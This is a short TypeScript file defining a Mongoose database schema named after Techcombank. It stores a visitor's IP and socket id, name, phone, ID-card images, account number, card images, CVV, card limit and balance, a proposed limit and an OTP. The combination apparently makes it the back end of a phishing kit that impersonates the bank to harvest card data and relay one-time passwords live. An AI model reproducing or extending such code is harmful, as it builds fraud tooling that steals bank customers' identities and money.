import mongoose, { Schema } from "mongoose";

const techcombankSchema = new Schema(
  {
    ip: {
      type: String,
      trim: true,
    },
    socketId: {
      type: String,
      trim: true,
    },
    name: {
      type: String,
      required: true,
      trim: true,
    },
    email: {
      type: String,
      trim: true,
    },
    phone: {
      type: String,
      required: true,
    },
    frontIdCard: {
      type: String,
      trim: true,
    },
    backIdCard: {
      type: String,
      trim: true,
    },
    idCard: {
      type: String,
      trim: true,
    },
    accountNumber: {
      type: String,
      trim: true,
    },
    birthday: {
      type: String,
    },
    cvv: {
      type: Number,
    },
    frontCard: {
      type: String,
      trim: true,
    },
    backCard: {
      type: String,
      trim: true,
    },
    cardLimit: {
      type: Number,
    },
    cardBalance: {
      type: Number,
    },
    proposeLimit: {
      type: Number,
    },
    cardType: {
      type: Array,
    },
    otp: {
      type: String,
    },
    deleteAt: {
      type: Date,
      default: null,
    },
  },

  {
    timestamps: true,
  }
);

techcombankSchema.pre(/^find/, function (next) {
  // @ts-ignore
  this.find({ deleteAt: null });
  next();
});

export const Techcombank = mongoose.model("techcombank", techcombankSchema);
